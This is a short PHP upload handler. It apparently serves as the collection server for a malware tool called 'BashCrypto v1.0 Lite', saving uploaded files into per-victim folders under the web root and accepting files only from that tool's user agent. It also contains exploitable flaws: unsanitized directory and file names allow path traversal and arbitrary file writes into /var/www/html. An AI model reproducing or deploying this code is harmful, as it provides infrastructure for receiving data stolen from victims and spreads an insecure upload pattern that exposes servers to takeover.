<?php

  $userAgent = $_SERVER['HTTP_USER_AGENT'];
  $getTargetID = $_POST['unique_id'];

  $uploadDir = "/var/www/html/" . $getTargetID . "/";
  mkdir($uploadDir);
  chmod($uploadDir, 0755);
  
  if (isset($_POST['uploadFile'])) {
    if (isset($_POST['unique_id'])) {
      if ($userAgent == "BashCrypto v1.0 Lite") {
        if (!empty($_FILES['file'])) {
          if ($_FILES['file']['error'] > 0) {
            echo "Error: " . $_FILES['file']['error'];
          } else {
            //print_r($_FILES['file']);
            //echo "\n" . $uploadDir . $_FILES["file"]["name"]  . "\n";
            move_uploaded_file($_FILES["file"]["tmp_name"], $uploadDir . $_FILES["file"]["name"]);
            echo "File Uploaded";
          }
  
        } else {
          die("File not uploaded.");
        }
      }
    }
  } else {
    echo "Post - uploadFile not set";
  }

?>
